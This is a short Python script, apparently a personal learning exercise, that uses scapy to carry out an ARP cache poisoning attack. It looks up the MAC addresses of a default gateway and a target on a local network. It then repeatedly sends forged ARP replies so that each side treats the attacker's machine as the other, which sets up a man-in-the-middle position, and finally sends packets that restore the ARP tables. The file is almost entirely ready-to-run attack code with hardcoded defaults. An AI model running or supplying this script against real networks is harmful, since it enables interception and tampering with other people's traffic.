"""
Date: 2022.04.24 17:01:53
LastEditors: Rustle Karl
LastEditTime: 2022.04.24 20:13:52
"""
from time import sleep

from scapy.layers.inet import Ether
from scapy.layers.l2 import ARP
from scapy.sendrecv import send, srp1


def get_mac_by_ip(ip="192.168.0.1"):
    """通过 IP 获取对方 MAC"""
    answer = srp1(Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(pdst=ip), timeout=2)
    if answer is not None:
        return answer[Ether].src
    return ""


def arp_cache_poisoning_attack(gateway_ip="192.168.0.1", target_ip="192.168.0.106"):
    """
    值 | 含义
    1 | ARP 请求
    2 | ARP 应答
    3 | RARP 请求
    4 | RARP 应答
    """

    # 让目标认为攻击者是网关
    target_mac = get_mac_by_ip(target_ip)
    poison_target = ARP(op=2, psrc=gateway_ip, pdst=target_ip, hwdst=target_mac)

    # 让网关认为攻击者是目标
    gateway_mac = get_mac_by_ip(gateway_ip)
    poison_gateway = ARP(op=2, psrc=target_ip, pdst=gateway_ip, hwdst=gateway_mac)

    for _ in range(100):
        try:
            send(poison_target)
            send(poison_gateway)
            sleep(2)
        except KeyboardInterrupt:
            break

    # 恢复
    restore_target = ARP(
        op=2,
        psrc=gateway_ip,
        hwsrc=gateway_mac,
        pdst=target_ip,
        hwdst="ff:ff:ff:ff:ff:ff",
    )

    send(restore_target, count=5)

    restore_gateway = ARP(
        op=2,
        psrc=target_ip,
        hwsrc=target_mac,
        pdst=gateway_ip,
        hwdst="ff:ff:ff:ff:ff:ff",
    )

    send(restore_gateway, count=5)


if __name__ == "__main__":
    print(get_mac_by_ip("192.168.0.106"))
    arp_cache_poisoning_attack()
